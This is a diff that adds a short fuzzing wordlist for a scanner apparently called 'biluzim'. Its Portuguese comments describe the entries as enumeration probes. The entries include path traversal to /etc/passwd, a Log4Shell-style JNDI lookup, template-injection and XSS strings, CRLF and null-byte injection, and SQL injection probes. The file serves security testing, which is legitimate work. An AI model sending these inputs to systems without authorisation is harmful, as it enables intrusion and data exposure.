@@ -1,0 +1,40 @@
+# biluzim - payloads iniciais para o modo fuzz (substituem FUZZ)
+# valores para descobrir diferencas de comportamento (enumeracao, nao exploracao)
+1
+0
+-1
+999999999
+test
+admin
+'
+"
+<>
+<!--
+]]>
+%00
+%0d%0a
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+/etc/passwd
+${jndi:ldap://example.com/a}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{{constructor.constructor('return 1')()}}
+<script>alert(1)</script>
+"onmouseover=alert(1)
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+${system:properties}
+%{context}
+{}
+[]
+{"a":1}
+null
+undefined
+NaN
+true
+a%00b
+SELECT 1--
+1 OR 1=1
+x;charset=utf-7
